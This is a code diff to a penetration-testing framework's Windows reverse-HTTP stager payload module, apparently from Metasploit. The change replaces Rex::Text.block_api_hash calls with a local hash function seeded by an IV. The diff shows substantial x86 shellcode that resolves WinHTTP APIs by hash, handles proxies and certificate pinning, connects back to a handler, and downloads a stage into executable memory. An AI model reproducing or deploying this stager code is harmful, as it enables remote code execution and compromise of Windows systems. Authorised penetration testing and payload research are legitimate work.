@@ -62,6 +62,7 @@ module Payload::Windows::ReverseWinHttp
   # Generate and compile the stager
   #
   def generate_reverse_winhttp(opts={})
+    block_api_iv # ensure the block API IV is generated before we generate the shellcode so that the hashes are correct
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
@@ -205,7 +206,7 @@ module Payload::Windows::ReverseWinHttp
         push 0x00707474        ; Push the string 'winhttp',0
         push 0x686E6977        ; ...
         push esp               ; Push a pointer to the "winhttp" string
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+        push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "winhttp" )
       ^
 
@@ -215,7 +216,7 @@ module Payload::Windows::ReverseWinHttp
         push 0x00323374        ; Push the string 'crypt32',0
         push 0x70797263        ; ...
         push esp               ; Push a pointer to the "crypt32" string
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+        push #{block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "wincrypt" )
       ^
     end
@@ -236,7 +237,7 @@ module Payload::Windows::ReverseWinHttp
                                ; ProxyName (via call)
         push 3                 ; AccessType (NAMED_PROXY= 3)
         push ebx               ; UserAgent (NULL) [1]
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpOpen')}
         call ebp
       ^
     else
@@ -246,7 +247,7 @@ module Payload::Windows::ReverseWinHttp
         push ebx               ; ProxyName (NULL)
         push ebx               ; AccessType (DEFAULT_PROXY= 0)
         push ebx               ; UserAgent (NULL) [1]
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpOpen')}
         call ebp
       ^
     end
@@ -280,7 +281,7 @@ module Payload::Windows::ReverseWinHttp
 
     asm << %Q^
         push eax               ; Session handle returned by WinHttpOpen
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpConnect')}
         call ebp
 
       WinHttpOpenRequest:
@@ -292,7 +293,7 @@ module Payload::Windows::ReverseWinHttp
         push edi               ; ObjectName (URI)
         push ebx               ; Verb (GET method) (NULL)
         push eax               ; Connect handle returned by WinHttpConnect
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
         call ebp
         xchg esi, eax          ; save HttpRequest handler in esi
       ^
@@ -325,7 +326,7 @@ module Payload::Windows::ReverseWinHttp
         push 1                 ; AuthScheme (WINHTTP_AUTH_SCHEME_BASIC = 1)
         push 1                 ; AuthTargets (WINHTTP_AUTH_TARGET_PROXY = 1)
         push esi               ; hRequest
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
         call ebp
       ^
     elsif opts[:proxy_ie] == true
@@ -337,7 +338,7 @@ module Payload::Windows::ReverseWinHttp
         push edi               ; store the current URL in case it's needed
         mov edi, eax           ; put the buffer pointer in edi
         push edi               ; Push a pointer to the buffer
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetIEProxyConfigForCurrentUser')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpGetIEProxyConfigForCurrentUser')}
         call ebp
 
         test eax, eax          ; skip the rest of the proxy stuff if the call failed
@@ -374,7 +375,7 @@ module Payload::Windows::ReverseWinHttp
         push edx               ; lpcwszUrl
         lea eax, [esp+64]      ; Find the pointer to the hSession - HACK!
         push [eax]             ; hSession
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetProxyForUrl')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpGetProxyForUrl')}
         call ebp
 
         test eax, eax          ; skip the rest of the proxy stuff if the call failed
@@ -403,7 +404,7 @@ module Payload::Windows::ReverseWinHttp
         push edi               ; lpBuffer (pointer to the proxy)
         push 38                ; dwOption (WINHTTP_OPTION_PROXY)
         push esi               ; hRequest
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpSetOption')}
         call ebp
 
       ie_proxy_setup_finish:
@@ -420,7 +421,7 @@ module Payload::Windows::ReverseWinHttp
         push eax               ; &buffer
         push 31                ; DWORD dwOption (WINHTTP_OPTION_SECURITY_FLAGS)
         push esi               ; hHttpRequest
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpSetOption')}
         call ebp
       ^
     end
@@ -456,7 +457,7 @@ module Payload::Windows::ReverseWinHttp
 
     asm << %Q^
         push esi               ; HttpRequest handle returned by WinHttpOpenRequest [1]
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
         call ebp
         test eax,eax
         jnz check_response     ; if TRUE call WinHttpReceiveResponse API
@@ -476,7 +477,7 @@ module Payload::Windows::ReverseWinHttp
       else
         asm << %Q^
       failure:
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}
+        push #{block_api_hash('kernel32.dll', 'ExitProcess')}
         call ebp
         ^
       end
@@ -500,7 +501,7 @@ module Payload::Windows::ReverseWinHttp
         push ebx             ; &buffer
         push 78              ; DWORD dwOption (WINHTTP_OPTION_SERVER_CERT_CONTEXT)
         push esi             ; hHttpRequest
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
         call ebp
         test eax, eax        ;
         jz failure           ; Bail out if we couldn't get the certificate context
@@ -517,7 +518,7 @@ module Payload::Windows::ReverseWinHttp
         push edi             ; &buffer (20-byte SHA1 hash)
         push 3               ; DWORD dwPropId (CERT_SHA1_HASH_PROP_ID)
         push [ebx]           ; *pCert
-        push #{Rex::Text.block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
+        push #{block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
         call ebp
         test eax, eax        ;
         jz failure           ; Bail out if we couldn't get the certificate context
@@ -555,7 +556,7 @@ module Payload::Windows::ReverseWinHttp
                                ; first to get a valid handle for WinHttpReadData
         push ebx               ; Reserved (NULL)
         push esi               ; Request handler returned by WinHttpSendRequest
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
         call ebp
         test eax,eax
         jz failure
@@ -570,7 +571,7 @@ module Payload::Windows::ReverseWinHttp
       push 4                 ; bytes to read
       push eax               ; &stage size
       push esi               ; hRequest
-      push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
+      push #{block_api_hash('winhttp.dll', 'WinHttpReadData')}
       call ebp               ; InternetReadFile(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead)
       pop ebx                ; bytesRead (unused, pop for cleaning)
       pop ebx                ; stage size
@@ -583,7 +584,7 @@ module Payload::Windows::ReverseWinHttp
       push 0x1000            ; MEM_COMMIT
       push ebx               ; Stage allocation
       push eax               ; NULL as we dont care where the allocation is
-      push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+      push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
     download_prep:
@@ -597,7 +598,7 @@ module Payload::Windows::ReverseWinHttp
       push eax               ; read length
       push ebx               ; buffer
       push esi               ; hRequest
-      push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
+      push #{block_api_hash('winhttp.dll', 'WinHttpReadData')}
       call ebp
       test eax,eax           ; download failed? (optional?)
       jz failure
@@ -610,7 +611,7 @@ module Payload::Windows::ReverseWinHttp
                                ; first to get a valid handle for WinHttpReadData
         push ebx               ; Reserved (NULL)
         push esi               ; Request handler returned by WinHttpSendRequest
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
         call ebp
         test eax,eax
         jz failure
@@ -620,7 +621,7 @@ module Payload::Windows::ReverseWinHttp
         push 0x1000            ; MEM_COMMIT
         push 0x00400000        ; Stage allocation (4Mb ought to do us)
         push ebx               ; NULL as we dont care where the allocation is
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+        push #{block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
       download_prep:
@@ -634,7 +635,7 @@ module Payload::Windows::ReverseWinHttp
         push 8192              ; NumberOfBytesToRead
         push ebx               ; Buffer
         push esi               ; Request handler returned by WinHttpReceiveResponse
-        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
+        push #{block_api_hash('winhttp.dll', 'WinHttpReadData')}
         call ebp
 
         test eax,eax           ; if download failed? (optional?)
